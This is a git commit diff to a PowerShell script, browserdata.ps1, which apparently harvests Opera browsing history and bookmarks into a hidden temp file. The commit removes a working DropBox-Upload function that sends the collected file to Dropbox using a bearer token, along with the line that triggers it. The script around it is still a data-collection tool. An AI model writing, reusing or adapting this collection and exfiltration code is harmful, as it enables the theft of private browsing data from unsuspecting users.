1e142001186a1e4b05011fbed39f6795d0782070
Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7 <143813623+Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7Z7@users.noreply.github.com>
2023-09-08 17:51:16 +0200

    Update browserdata.ps1

--- browserdata.ps1
+++ browserdata.ps1
@@ -46,29 +46,6 @@ Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.t
 
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
 
-# Upload output file to dropbox
-
-function DropBox-Upload {
-
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\--BrowserData.txt}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
